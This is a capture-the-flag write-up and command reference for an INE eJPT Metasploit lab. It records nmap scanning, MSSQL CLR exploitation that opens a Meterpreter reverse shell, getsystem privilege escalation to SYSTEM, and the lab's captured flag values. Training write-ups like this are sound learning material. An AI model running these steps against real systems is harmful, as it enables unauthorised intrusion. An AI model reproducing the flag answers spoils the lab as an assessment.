# Command Reference: Host & Network Penetration Testing – The Metasploit Framework CTF 1

This document provides a clean, categorized, copy-paste-friendly command reference documenting the attack workflow executed during the **INE eJPT Host & Network Penetration Testing: The Metasploit Framework CTF 1** assessment.

Each command is annotated with its operational environment (`Kali Linux`, `msfconsole`, `Meterpreter`, or `Windows Command Shell`) and technical purpose.

---

## 1. Network Reconnaissance & Port Scanning

### Full TCP Port Sweep with Service & Default Script Detection
**Environment:** `Kali Linux (bash)`
```bash
nmap -sV -sC -p- target.ine.local
```
- **What it does**: Scans all 65,535 TCP ports (`-p-`), performs service version detection (`-sV`), and runs default Nmap NSE scripts (`-sC`) against `target.ine.local`.
- **Why it is used**: Identifies the full attack surface, discovering open ports, service banners, operating system versions, and specific service configurations (such as MSSQL instance names and authentication modes).
- **Key Parameters**:
  - `-sV`: Probes open ports to determine service/version info.
  - `-sC`: Equivalent to `--script=default`, runs standard detection scripts including `ms-sql-info` and `ms-sql-ntlm-info`.
  - `-p-`: Scans ports 1 through 65535.
- **Expected Output**: Identification of Microsoft SQL Server 2012 SP3 on port 1433/tcp (`MSSQLSERVER` instance, Windows Server 2012 R2 build 9600).
- **Screenshot Reference**: `02-nmap-mssql-service-detection.png` (Screenshot 02).

---

## 2. Metasploit Framework Exploitation (MSSQL CLR)

### Launching the Metasploit Framework Console
**Environment:** `Kali Linux (bash)`
```bash
msfconsole -q
```
- **What it does**: Starts the interactive Metasploit Framework console in quiet mode (`-q`), suppressing the startup banner.

### Searching for MSSQL Exploit Modules
**Environment:** `msfconsole`
```text
msf6 > search mssql
msf6 > search mssql_clr_payload
```
- **What it does**: Searches the Metasploit module database for exploits and post-exploitation modules targeting Microsoft SQL Server.
- **Why it is used**: Locates reliable remote code execution vectors for authenticated or misconfigured MSSQL database engines.

### Selecting the MSSQL CLR Execution Module
**Environment:** `msfconsole`
```text
msf6 > use exploit/windows/mssql/mssql_clr_payload
```
- **What it does**: Loads the Common Language Runtime (CLR) assembly payload execution exploit module.
- **Why it is used**: MSSQL CLR integration allows custom .NET assemblies to execute inside the database process. When the database is configured as `TRUSTWORTHY` and CLR execution is enabled, an attacker with administrative SQL privileges can upload and execute a compiled payload assembly to gain operating system command execution.

### Configuring Target and Payload Settings
**Environment:** `msfconsole`
```text
msf6 exploit(windows/mssql/mssql_clr_payload) > set rhosts target.ine.local
msf6 exploit(windows/mssql/mssql_clr_payload) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > show options
```
- **What it does**:
  - `set rhosts target.ine.local`: Configures the target hostname/IP address.
  - `set payload windows/x64/meterpreter/reverse_tcp`: Selects a 64-bit Meterpreter reverse TCP staged payload matching the 64-bit Windows architecture (`x86_64`) of the target server.
  - `show options`: Displays and validates all required and optional module parameters before firing.

### Executing the Exploit
**Environment:** `msfconsole`
```text
msf6 exploit(windows/mssql/mssql_clr_payload) > run
```
- **What it does**: Initiates the attack:
  1. Connects to MSSQL port 1433.
  2. Enables `TRUSTWORTHY` and CLR integration on the target database.
  3. Uploads custom payload assembly v3.5.
  4. Exposes a custom stored procedure and invokes the payload.
  5. Cleans up the stored procedure and assembly.
  6. Catches the incoming reverse staged connection and opens an active Meterpreter session.
- **Observed Result**: `Meterpreter session 1 opened (10.10.44.2:4444 -> 10.5.21.197:49569)`.
- **Screenshot Reference**: `04-mssql-exploit-configuration.png` (Screenshot 04).

---

## 3. Flag 1 Retrieval: Low-Privilege Service Account Access

### Dropping to a Native Windows Command Shell
**Environment:** `Meterpreter`
```text
meterpreter > shell
```
- **What it does**: Spawns an interactive Windows command prompt (`cmd.exe`) within the context of the running payload process.
- **Initial Working Directory**: `C:\Windows\system32>`

### Navigating to the System Root Drive and Listing Files
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
cd \
dir
```
- **What it does**: Changes directory to the root drive `C:\` and lists directories and files.
- **Observed Result**: Discovers `flag1.txt` (34 bytes) created on `11/22/2026 05:48 AM`.

### Reading Flag 1
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
type flag1.txt
```
- **What it does**: Displays the text content of `flag1.txt`.
- **Verified Flag 1 Value**: `7f75cd66ffe2477391f45fcf7d965933`
- **Screenshot Reference**: `06-flag1-retrieval.png` (Screenshot 06).

---

## 4. Flag 2 Investigation: Access Denied & Privilege Escalation

### Attempting to Access the Windows Configuration Directory
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
cd C:\Windows\system32
cd config
```
- **What it does**: Attempts to navigate into `C:\Windows\System32\config`.
- **Observed Result**:
  ```text
  C:\Windows\system32> cd config
  cd config
  Access is denied.
  ```
- **Analysis**: The service account running MSSQL possesses restricted NTFS file permissions that prevent reading or traversing `C:\Windows\System32\config`.
- **Screenshot Reference**: `07-flag2-access-denied.png` (Screenshot 07).

### Returning to Meterpreter
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
exit
```
- **What it does**: Terminates the command shell channel and returns to the active Meterpreter prompt.

### Enumerating Token Privileges
**Environment:** `Meterpreter`
```text
meterpreter > getprivs
```
- **What it does**: Queries the Windows security access token of the current Meterpreter process to enumerate assigned privileges.
- **Observed Result**:
  ```text
  Enabled Process Privileges
  ==========================
  Name
  ----
  SeAssignPrimaryTokenPrivilege
  SeChangeNotifyPrivilege
  SeCreateGlobalPrivilege
  SeImpersonatePrivilege
  SeIncreaseQuotaPrivilege
  SeIncreaseWorkingSetPrivilege
  ```
- **Analysis**: The presence of `SeImpersonatePrivilege` permits the process to impersonate security tokens of client connections. This privilege creates a potential local privilege-escalation opportunity if a privileged token can be intercepted or coerced, rather than acting as an automatic vulnerability by itself. In this environment, the privilege was successfully leveraged to escalate privileges.
- **Screenshot Reference**: `08-meterpreter-privilege-enumeration.png` (Screenshot 08).

### Escalating Privileges to NT AUTHORITY\SYSTEM via getsystem
**Environment:** `Meterpreter`
```text
meterpreter > getsystem
```
- **What it does**: Attempts multiple automated Windows token impersonation and named pipe privilege escalation techniques.
- **Observed Result**:
  ```text
  ... got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
  ```
- **Analysis**: Successfully elevated privileges to `NT AUTHORITY\SYSTEM` using named pipe impersonation via the Print Spooler service exploit technique.
- **Screenshot Reference**: `08-meterpreter-privilege-enumeration.png` (Screenshot 08).

---

## 5. Flag 2 Retrieval: Windows Configuration Directory

### Spawning an Elevated Command Shell
**Environment:** `Meterpreter`
```text
meterpreter > shell
```
- **What it does**: Creates a new interactive command shell executing with full `SYSTEM` authority.

### Navigating to `C:\Windows\System32\config` and Locating Flag 2
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
cd config\
dir
```
- **What it does**: Traverses into the configuration directory and lists files.
- **Observed Result**: Access is granted under the elevated SYSTEM shell. Confirmed presence of `flag2.txt` (34 bytes) alongside core registry hives (`SAM`, `SECURITY`, `SOFTWARE`, `SYSTEM`).
- **Screenshot Reference**: `10-flag2-retrieval.png` (Screenshot 10).

### Reading Flag 2
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
type flag2.txt
```
- **What it does**: Reads the contents of `C:\Windows\System32\config\flag2.txt`.
- **Evidence Limitation**: The command `type flag2.txt` is visible at the bottom of the prompt in Screenshot 10, and objective completion was validated on the INE challenge dashboard (`Flag captured`). However, the terminal output displaying the plaintext flag string was cut off before capture and is not claimed as visually verified. The flag value is preserved without inventing unverified text.

---

## 6. Flag 3 Retrieval: Recursive System32 Search & Hint Discovery

### Navigating to System32 and Executing Recursive Text File Search
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
cd C:\Windows\system32
dir C:\Windows\System32\*.txt /s /b
```
- **What it does**: Searches `C:\Windows\System32` recursively (`/s`) for all files ending in `.txt` and displays output in bare format (`/b` - paths only).
- **Why it is used**: Systematically locates non-standard text files and flags placed in subdirectories when exact file paths are unknown.
- **Observed Result**:
  ```text
  C:\Windows\System32\catroot2\dberr.txt
  C:\Windows\System32\config\flag2.txt
  C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
  C:\Windows\System32\drivers\gmreadme.txt
  C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
  C:\Windows\System32\en-US\erofflps.txt
  C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
  C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
  ```
- **Analysis**: Identified suspicious flag file `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt`.
- **Screenshot Reference**: `11-flag3-recursive-txt-search.png` (Screenshot 11).

### Reading Flag 3
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
```
- **What it does**: Reads the contents of the discovered file in `drivers\etc`.
- **Verified Flag 3 Value**: `1148572be0374b2aa6e0d6910adb4ab7`
- **Operational Hint**: Filename `EscaltePrivilageToGetThisFlag.txt` confirms that privilege escalation is required to achieve complete system control.
- **Screenshot Reference**: `11-flag3-recursive-txt-search.png` (Screenshot 11).

---

## 7. Flag 4 Retrieval: Administrator Desktop Investigation

### Navigating to the Administrator Profile Desktop
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
cd \
cd Users\Administrator\Desktop
dir
```
- **What it does**: Changes directory to root `C:\`, traverses into `C:\Users\Administrator\Desktop`, and lists directory contents.
- **Observed Result**: Confirmed presence of `flag4.txt` (34 bytes) created on `11/22/2026 05:48 AM`.

### Reading Flag 4
**Environment:** `Windows Command Shell (cmd.exe)`
```cmd
type flag4.txt
```
- **What it does**: Displays the text content of `flag4.txt`.
- **Verified Flag 4 Value**: `9686f22ba7d84fa9bdb27916d56c354c`
- **Screenshot Reference**: `13-flag4-administrator-desktop.png` (Screenshot 13).

---

## 8. Summary of Verified Flag Values

| Flag | Target System | Operating Context | File Path | Verified Value | Validation Status |
| :---: | :---: | :--- | :--- | :--- | :---: |
| **Flag 1** | `target.ine.local` | Low-Privilege MSSQL Shell | `C:\flag1.txt` | `7f75cd66ffe2477391f45fcf7d965933` | Visually Verified |
| **Flag 2** | `target.ine.local` | Elevated SYSTEM Shell | `C:\Windows\System32\config\flag2.txt` | `[CAPTURED]` | Lab Verified (Terminal Output Truncated) |
| **Flag 3** | `target.ine.local` | Elevated SYSTEM Shell | `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt` | `1148572be0374b2aa6e0d6910adb4ab7` | Visually Verified |
| **Flag 4** | `target.ine.local` | Elevated SYSTEM Shell | `C:\Users\Administrator\Desktop\flag4.txt` | `9686f22ba7d84fa9bdb27916d56c354c` | Visually Verified |
